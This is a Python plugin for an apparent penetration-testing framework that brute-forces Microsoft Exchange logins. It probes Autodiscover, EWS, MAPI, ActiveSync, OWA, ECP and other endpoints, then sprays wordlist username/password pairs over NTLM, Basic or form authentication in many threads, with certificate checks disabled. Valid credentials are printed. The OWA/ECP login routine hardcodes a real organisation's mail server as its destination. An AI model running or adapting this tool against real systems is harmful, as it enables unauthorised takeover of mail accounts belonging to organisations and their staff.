import argparse
from copy import copy

from plugins.Exchange import PluginExchangeBase
from utils import output
from utils.consts import AllPluginTypes
from base64 import encodebytes

import requests
import urllib3
from requests_ntlm import HttpNtlmAuth
import concurrent.futures
from concurrent.futures import wait, ALL_COMPLETED

urllib3.disable_warnings()


class PluginExchangeInterfaceBrute(PluginExchangeBase):
    display = "Exchange 接口用户密码爆破"
    alias = "ex_brute"
    p_type = AllPluginTypes.Exploit

    def __init__(self):
        super().__init__()

    def reg_argument(self, parser: argparse.ArgumentParser):
        parser.description = self.display

        parser.add_argument("-d", dest="domain", required=True, help="邮箱地址/IP")

        cgroup = parser.add_argument_group("check")
        cgroup.add_argument("-c", "--check", dest="check", default=False, action='store_true',
                            help="验证各接口是否存在爆破的可能性")

        bgroup = parser.add_argument_group("brute")

        bgroup.add_argument("--user-file", dest="userfile", help="用户文件")
        bgroup.add_argument("--pass-file", dest="passfile", help="密码文件")
        bgroup.add_argument("-u", "--username", dest="user", help="指定用户名")
        bgroup.add_argument("-p", "--password", dest="password", help="指定密码")
        bgroup.add_argument("-t", "--threads", dest="threads", type=int, default=10, help="线程数量, 默认为10")

        bgroup.add_argument("--protocol", dest="protocol", action='store_true',
                            help="通讯协议默认https, demo: --protocol http")

        bgroup.add_argument("-i", "--interface", help="接口类型\n"
                                                      "autodiscover接口, 默认NTLM认证方式, 自Exchange Server 2007开始推出的一项自动服务, 用于自动配置用户在Outlook中邮箱的相关设置, 简化用户登陆使用邮箱的流程。\n" +
                                                      "ews接口, 默认NTLM认证方式, Exchange Web Service,实现客户端与服务端之间基于HTTP的SOAP交互\n" +
                                                      "mapi接口, 默认NTLM认证方式, Outlook连接Exchange的默认方式, 在2013和2013之后开始使用, 2010 sp2同样支持\n" +
                                                      "activesync接口, 默认Basic认证方式, 用于移动应用程序访问电子邮件\n" +
                                                      "oab接口, 默认NTLM认证方式, 用于为Outlook客户端提供地址簿的副本, 减轻Exchange的负担\n" +
                                                      "rpc接口, 默认NTLM认证方式, 早期的Outlook还使用称为Outlook Anywhere的RPC交互\n" +
                                                      "api接口, 默认NTLM认证方式\n" +
                                                      "owa接口, 默认http认证方式, Exchange owa 接口, 用于通过web应用程序访问邮件、日历、任务和联系人等\n" +
                                                      "powershell接口（暂不支持）, 默认Kerberos认证方式, 用于服务器管理的Exchange管理控制台\n" +
                                                      "ecp接口, 默认http认证方式, Exchange管理中心, 管理员用于管理组织中的Exchange的Web控制台\n",
                            choices=["autodiscover",
                                     "ews",
                                     "mapi",
                                     "activesync",
                                     "oab",
                                     "rpc",
                                     "api",
                                     "owa",
                                     "powershell",
                                     "ecp"], default="autodiscover", dest="interface")

    def run_script(self, args) -> dict:
        """
        脚本入口函数
        :return: bool
        """
        result = copy(self.result)

        if args.check and args.domain:
            Check_Exchange_User(args.domain).check_interface_valid()
            return result

        scan = Check_Exchange_User(args.domain, args.interface, args.protocol, args.user, args.userfile, args.password,
                                   args.passfile, args.threads)
        if not scan.check_url_authenticate():
            output.error("Unsupported authentication method")
            return result

        execute_results = []
        with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:
            for lst_info in scan.dict:
                r = executor.submit(scan.check_exchange_interface, lst_info["user"], lst_info["passwd"])
                execute_results.append(r)

            wait(execute_results, return_when=ALL_COMPLETED)

        return result


class Check_Exchange_User:
    def __init__(self, domain, type=None, protocol=None, user=None, userfile=None, password=None, passfile=None,
                 thread=10):
        self.domain, self.user, self.userfile, self.password, self.passfile, self.thread = domain, user, userfile, password, passfile, thread
        self.URL = {
            "autodiscover":
                {"url": "%s://%s/autodiscover" % ("http" if protocol == "http" else "https", domain), "mode": "NTLM"},
            "ews":
                {"url": "%s://%s/ews" % ("http" if protocol == "http" else "https", domain), "mode": "NTLM"},
            "mapi":
                {"url": "%s://%s/mapi" % ("http" if protocol == "http" else "https", domain), "mode": "NTLM"},
            "activesync":
                {"url": "%s://%s/Microsoft-Server-ActiveSync" % ("http" if protocol == "http" else "https", domain),
                 "mode": "Basic"},
            "oab":
                {"url": "%s://%s/oab" % ("http" if protocol == "http" else "https", domain), "mode": "NTLM"},
            "rpc":
                {"url": "%s://%s/rpc" % ("http" if protocol == "http" else "https", domain), "mode": "NTLM"},
            "api":
                {"url": "%s://%s/api" % ("http" if protocol == "http" else "https", domain), "mode": "NTLM"},
            "owa":
                {"url": "%s://%s/owa/auth.owa" % ("http" if protocol == "http" else "https", domain), "mode": "HTTP"},
            "powershell":
                {"url": "%s://%s/powershell" % ("http" if protocol == "http" else "https", domain), "mode": "Kerberos"},
            "ecp":
                {"url": "%s://%s/owa/auth.owa" % ("http" if protocol == "http" else "https", domain), "mode": "HTTP"}
        }
        self.HEADERS = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:69.0) Gecko/20100101 Firefox/69.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "close",
            "Upgrade-Insecure-Requests": "1",
        }
        if not user and not userfile:
            return

        self.ReqInfo = self.URL[type]
        output.info(f"request mode: {self.ReqInfo['mode']}\n"
                    f"{'':^4}url: {self.ReqInfo['url']}")

        # 导入字段用户
        self.dict = []
        self._load_dict()
        # 结果存储

    # NTLM认证验证
    def check_ntlm_userpass(self, user, password, url):
        try:
            output.debug(f"Testing {user}:{password}")
            response = requests.get(url, auth=HttpNtlmAuth(user, password), headers=self.HEADERS, verify=False)
            if 401 != response.status_code and 408 != response.status_code and 504 != response.status_code:
                return True
            else:
                return False
        except Exception as e:
            output.error(f"error check_NTLM_userpass: {e}")
            return False

    # Basic认证验证
    def check_Basic_userpass(self, user, password, url):
        try:
            HEADERS = self.HEADERS
            HEADERS["Authorization"] = "Basic %s" % encodebytes('%s:%s' % (user, password))[:-1]
            request = requests.session()
            request.keep_alive = False
            response = request.get(url, headers=HEADERS, verify=False)
            if 401 != response.status_code and 408 != response.status_code and 504 != response.status_code:
                return True
            else:
                return False
        except Exception as e:
            output.error(f"error check_Basic_userpass: {e}")
            return False

    # http认证验证
    def check_http_userpass(self, user, password, url, type="ecp"):
        try:
            if type == "owa":
                urldata = "https://mail.netone.co.zw/owa/"
            else:
                urldata = "https://mail.netone.co.zw/cep/"
            HEADERS = self.HEADERS
            HEADERS["Cache-Control"] = "max-age=0"
            HEADERS["Content-Type"] = "application/x-www-form-urlencoded"
            HEADERS[
                "Referer"] = "https://" + self.domain + "/owa/auth/logon.aspx?replaceCurrent=1&url=" + urldata
            HEADERS["Cookie"] = "PrivateComputer=true; PBack=0"

            data = {
                "destination": urldata,
                "flags": "4",
                "forcedownlevel": "0",
                "username": user,
                "password": password,
                "passwordText": "",
                "isUtf8": "1"
            }
            request = requests.session()
            request.keep_alive = False
            response = request.post(url, data=data, headers=HEADERS, allow_redirects=False, verify=False)
            if "Location" not in response.headers:
                return False
            if "reason" not in response.headers["Location"]:
                return True
            else:
                return False
        except Exception as e:
            output.error(f"error check_HTTP_userpass: {e}")
            return False

    # 爆破exchange接口
    def check_exchange_interface(self, user, password):
        url, mode = self.ReqInfo["url"], self.ReqInfo["mode"]

        status = False
        if mode == "NTLM":
            status = self.check_ntlm_userpass(user, password, url)
        elif mode == "Basic":
            status = self.check_Basic_userpass(user, password, url)
        elif mode == "HTTP":
            _type = "owa" if "/owa" in self.ReqInfo['url'] else "ecp"
            status = self.check_http_userpass(user, password, url, type=_type)

        if status:
            output.info(f"success get credentials {output.RED}{user}{output.BLUE}:{output.RED}{password}{output.BLUE}")

    # 导入爆破字典字典
    def _load_dict(self):
        userdict, passdict = [], []

        if self.userfile:
            with open(self.userfile) as f:
                for line in f:
                    if "\\" in line.strip():
                        userdict.append(line.strip())
        else:
            if "\\" in self.user.strip():
                userdict.append(self.user.strip())
            else:
                output.error("invalid user format")
                return False

        if self.password:
            passdict.append(self.password.strip())
        else:
            with open(self.passfile) as f:
                for line in f:
                    passdict.append(line.strip())

        for user in userdict:
            for passwd in passdict:
                self.dict.append({"user": user, "passwd": passwd})

    # 验证接口有效性, 判断是否存在接口爆破的可能
    def check_interface_valid(self):
        for (k, v) in self.URL.items():
            url = v["url"]
            request = requests.session()
            request.keep_alive = False
            try:
                response = request.get(url, headers=self.HEADERS, allow_redirects=False, verify=False)
                if 404 != response.status_code and 301 != response.status_code and 302 != response.status_code and 403 != response.status_code:
                    output.success(
                        u"URL: %s ,code:%s" % (url, response.status_code) + u"\t有效可以爆破")
                else:
                    output.error(u"URL: %s ,code:%s" % (url, response.status_code) + u"\t失败无法爆破")
            except Exception as e:
                output.error(e)

    # 检测接口认证方式开通了哪些, 并替换为已开通的方式
    def check_url_authenticate(self):
        url = self.ReqInfo["url"]
        mode = self.ReqInfo["mode"]
        if mode == "HTTP":
            return True

        request = requests.session()
        request.keep_alive = False
        response = request.get(url, headers=self.HEADERS, verify=False)
        authenticate_type = response.headers["WWW-Authenticate"]
        # 认证方式不为默认类型, 则替换为支持的类型
        if mode not in authenticate_type:
            if "NTLM" in authenticate_type:
                self.ReqInfo["mode"] = "NTLM"
            elif "Basic" in authenticate_type:
                self.ReqInfo["mode"] = "Basic"
            else:
                return False
        return True
